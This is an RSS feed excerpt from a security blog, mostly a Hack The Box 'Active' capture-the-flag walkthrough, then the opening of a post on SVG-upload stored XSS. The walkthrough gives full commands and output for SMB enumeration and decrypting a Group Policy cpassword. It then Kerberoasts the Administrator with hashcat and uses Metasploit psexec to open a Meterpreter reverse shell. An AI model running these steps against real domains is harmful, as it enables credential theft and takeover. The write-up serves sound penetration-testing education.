&lt;p&gt;The ldap-brute script can also be used to conduct brute force attacks on the server using LDAP, however this can be dangeorus and could lock out valid accounts. If Anonymous Bind is enabled , we could conduct ldap search queries to try searching for the base. However, it looks like that is not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b &quot;dc=active,dc=htb&quot;
# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=active,dc=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v1db1

# numResponses: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;

&lt;p&gt;Since SMB is open, enum4linux can be used to conduct information on that service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# enum4linux 10.10.10.100
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 17:23:52 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.100    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.100    |
 ============================================ 
Looking up status of 10.10.10.100
No reply from 10.10.10.100

 ===================================== 
|    Session Check on 10.10.10.100    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.100 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.100    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.100    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.100 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.100    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication	Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Users	Mapping: DENIED, Listing: N/A

 ==================================================== 
|    Password Policy Information for 10.10.10.100    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

[+] Trying protocol 139/SMB...

	[!] Protocol failed: ('Cannot request session', 240, 130)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.10.100    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
[E] Can't get local groups: NT_STATUS_ACCESS_DENIED

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.10.100    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Jun 22 17:24:30 2019
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L 10.10.10.100&lt;/code&gt;) can also be used to confirm this.&lt;/p&gt;

&lt;p&gt;By enumerating this share using smbmap, the following can be seen:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	Replication                                       	READ ONLY
	.\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
	.\\active.htb\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	scripts
	.\\active.htb\DfsrPrivate\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Installing
	.\\active.htb\Policies\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               23 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              119 Sat Jul 21 06:38:11 2018	GPE.INI
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Preferences
	-r--r--r--             2788 Sat Jul 21 06:38:11 2018	Registry.pol
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	SecEdit
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--             1098 Sat Jul 21 06:38:11 2018	GptTmpl.inf
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               22 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Looking at the obtained Groups.xml file, the important sections in the groups.xml file are the username and cpassword.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2018-07-18 20:46:06&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;gpp-decrypt can be used to get the plaintext value of the recovered cpassword.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using metasploit’s SMB Login module, these credentials can be used to double check access.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary(scanner/smb/smb_login) &amp;gt; run

[*] 10.10.10.100:445      - 10.10.10.100:445 - Starting SMB login bruteforce
[+] 10.10.10.100:445      - 10.10.10.100:445 - Success: 'active.htb\SVC_TGS:GPPstillStandingStrong2k18'
[!] 10.10.10.100:445      - No active DB -- Credential data will not be saved!
[*] 10.10.10.100:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, it looks like this user doesn’t have administrator privileges so psexec is not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'SVC_TGS'...
[-] 10.10.10.100:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Enumeration the shares again using smbmap, the users share seems to be accessible&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	NO ACCESS
	NETLOGON                                          	READ ONLY
	Replication                                       	READ ONLY
	SYSVOL                                            	READ ONLY
	Users                                             	READ ONLY
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Enumeration of the SVC_TGS user directories revealed that the user.txt is stored within the user’s desktop.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\SVC_TGS\\Desktop
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	Users                                             	READ ONLY
	.SVC_TGS\Desktop                                   
	dr--r--r--                0 Sat Jul 21 11:14:42 2018	.
	dr--r--r--                0 Sat Jul 21 11:14:42 2018	..
	fr--r--r--               34 Sat Jul 21 11:14:42 2018	user.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be fetched to get the user token for this machine: &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;bloodhound&quot;&gt;BloodHound&lt;/h3&gt;

&lt;p&gt;Some references on how to use BloodHound can be seen below.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.cptjesus.com/posts/newbloodhoundingestor&lt;/li&gt;
  &lt;li&gt;https://thenoobsway.com/active-directory-reconnaissance-using-bloodhound/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since we have low privilege credentials, we could authenticate via LDAP and &lt;code class=&quot;highlighter-rouge&quot;&gt;ad-ldap-enum&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapdomaindump&lt;/code&gt; to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to  &lt;code class=&quot;highlighter-rouge&quot;&gt;svc_tgs&lt;/code&gt; being a service account, runas can been used to start a shell as a low priv user. The following command can be used: &lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:active.htb\svc_tgs cmd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: &lt;code class=&quot;highlighter-rouge&quot;&gt;.\SharpHound.exe -c all -d active.htb --DomainController&lt;/code&gt;. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Importing the SharpHound results into BloodHound and by looking at the results, it looks like the administrator user is kerberoastable due to the user being configured with a SPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...c03146
Time.Started.....: Thu Jul  4 19:55:19 2019 (27 secs)
Time.Estimated...: Thu Jul  4 19:55:46 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   394.9 kH/s (6.04ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -&amp;gt; Thelittlemermaid

Started: Thu Jul  4 19:55:09 2019
Stopped: Thu Jul  4 19:55:46 2019
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;Ticketmaster1968&lt;/code&gt;, psexec can be used to login to the system and get root.txt. &lt;code class=&quot;highlighter-rouge&quot;&gt;wmiexec&lt;/code&gt; from impacket and &lt;code class=&quot;highlighter-rouge&quot;&gt;pth-wmis&lt;/code&gt; can also be used instead of MetaSploit psexec.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 10.10.10.100
RHOSTS =&amp;gt; 10.10.10.100
msf5 exploit(windows/smb/psexec) &amp;gt; set SMBDomain active.htb
SMBDomain =&amp;gt; active.htb
msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBUser Administrator
SMBUser =&amp;gt; Administrator
msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBPass Ticketmaster1968
SMBPass =&amp;gt; Ticketmaster1968
msf5 exploit(windows/smb/psexec) &amp;gt; run

[*] Started reverse TCP handler on 10.10.14.41:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...
[*] 10.10.10.100:445 - Selecting PowerShell target
[*] 10.10.10.100:445 - Executing the payload...
[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.14.41:4444 -&amp;gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The root hash can be found within the Administrator’s desktop.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt
type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b

C:\Users\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 28 Dec 2018 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Ghost Publishing Platform – SVG Image Upload to Stored Cross-site scripting</title>
        <description>&lt;p&gt;Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript.  if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. 
Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS.
Scalable Vector Graphics (SVG).&lt;/p&gt;

&lt;p&gt;Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations.
